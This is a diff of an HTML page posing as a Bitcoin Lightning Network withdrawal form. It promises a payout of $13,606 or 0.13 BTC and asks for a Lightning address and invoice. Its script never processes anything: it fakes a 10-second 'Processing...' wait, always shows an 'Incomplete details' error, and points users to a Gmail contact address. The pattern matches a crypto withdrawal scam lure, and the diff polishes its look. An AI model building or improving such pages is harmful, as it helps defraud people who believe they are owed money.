@@ -2,103 +2,119 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Withdraw BTC - Lightning Network</title>
+  <title>BTC Lightning Network Withdrawal</title>
   <style>
     body {
-      background-color: #f9f9f9;
+      background-color: #f2f2f2;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 40px;
+      padding: 30px;
+    }
+
+    .container {
+      background-color: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      max-width: 500px;
+      margin: auto;
     }
 
     img {
-      width: 150px;
-      margin-bottom: 10px;
+      max-width: 150px;
     }
 
     h2 {
-      margin-top: 0;
-      color: #333;
-    }
-
-    h3 {
-      color: #444;
+      color: #ff9900;
+      margin-top: 10px;
       margin-bottom: 30px;
     }
 
     input {
-      display: block;
-      margin: 15px auto;
+      width: 90%;
       padding: 10px;
-      width: 300px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
       font-size: 16px;
     }
 
     button {
-      padding: 10px 20px;
-      font-size: 16px;
       background-color: #ff9900;
-      border: none;
       color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
       cursor: pointer;
     }
 
-    #loading {
-      display: none;
-      margin: 20px auto;
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
 
-    #error {
-      color: red;
-      margin-top: 20px;
-      font-weight: bold;
-      display: none;
-    }
-
-    .footer {
-      margin-top: 100px;
+    .email-link {
+      margin-top: 30px;
       font-size: 12px;
       color: blue;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 5px;
     }
 
-    .footer img {
-      width: 14px;
-      vertical-align: middle;
-      margin-right: 5px;
+    .email-link img {
+      width: 16px;
+      height: 16px;
+    }
+
+    .error-message {
+      color: red;
+      margin-top: 15px;
     }
   </style>
 </head>
 <body>
 
-  <!-- Embedded logo using base64 -->
-  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0CAYAAAB5oPpXAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAALEgAACxIB0t1+/AAABExJREFUeJzt3cFtwkAUgFE9ExAkYHxxJ1GRqGCEHoAHIomqZPb6RfLb5VX8l/vNGkEFAAAAAAAAAAAAAMDvXj3x5Z1t/fx1ne/O7Kfd/Kn+v1ZwfPrOtHv9T+WQ57+kv9L9Wftq9L9ZcZgDjOwV9Wfq79Rv2V+xv1f5j+wPi5/xs1H77+bS3iY4EVrIyfPu4AH0f/17WsfRdy+Cyt1HywdE3uESoVZqD92UVf36+99XsF6ru9gCNQeXvXuOBiWHPTIckvl5zKMj+hUONOUeM2/4F8z56E97+uAIAAAAAAAAAAAD4q+wvA/Cbyf2R8UOeAAAAAElFTkSuQmCC" alt="Bitcoin Lightning Logo">
+  <div class="container">
+    <!-- ✅ GitHub-hosted image -->
+    <img src="https://raw.githubusercontent.com/cryptvcf/lightning-network-/refs/heads/main/Bitcoin_lightning_sticker.png" alt="Bitcoin Lightning Logo">
+    <h2>Lightning Network</h2>
 
-  <h2>lightning network</h2>
-  <h3>Withdraw $13,606 via BTC Lightning Network</h3>
+    <!-- Input fields -->
+    <input type="text" id="address" placeholder="Enter your BTC Lightning address">
+    <input type="text" id="invoice" placeholder="Enter your BTC Lightning invoice number">
+    <input type="text" id="amount" placeholder="Enter amount: 0.13 BTC" value="0.13">
 
-  <input type="text" id="address" placeholder="Enter BTC Lightning Address">
-  <input type="text" id="invoice" placeholder="Enter Lightning Invoice Number">
-  <input type="text" id="amount" placeholder="Amount (fixed: 0.13 BTC)" value="0.13 BTC" readonly>
+    <!-- Button -->
+    <button onclick="simulateWithdraw()">Confirm Withdraw</button>
 
-  <button onclick="submitWithdraw()">Confirm Withdraw</button>
+    <!-- Error message -->
+    <div id="error" class="error-message"></div>
 
-  <div id="loading">Processing...</div>
-  <div id="error">Incomplete details (please input correct network withdraw details).</div>
-
-  <div class="footer">
-    <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.png?v=026" alt="BTC Icon">
-    contact.lightnin.network@gmail.com
+    <!-- Email link at bottom -->
+    <div class="email-link">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg" alt="BTC icon">
+      <a href="mailto:contact.lightnin.network@gmail.com">contact.lightnin.network@gmail.com</a>
+    </div>
   </div>
 
+  <!-- JavaScript for button behavior -->
   <script>
-    function submitWithdraw() {
-      document.getElementById("loading").style.display = "block";
-      document.getElementById("error").style.display = "none";
+    function simulateWithdraw() {
+      const errorBox = document.getElementById("error");
+      errorBox.textContent = "";
+      const button = document.querySelector("button");
+
+      button.disabled = true;
+      button.textContent = "Processing...";
 
       setTimeout(() => {
-        document.getElementById("loading").style.display = "none";
-        document.getElementById("error").style.display = "block";
-      }, 10000); // 10 seconds
+        button.disabled = false;
+        button.textContent = "Confirm Withdraw";
+        errorBox.textContent = "Incomplete details (please input correct network withdraw details).";
+      }, 10000);
     }
   </script>
 
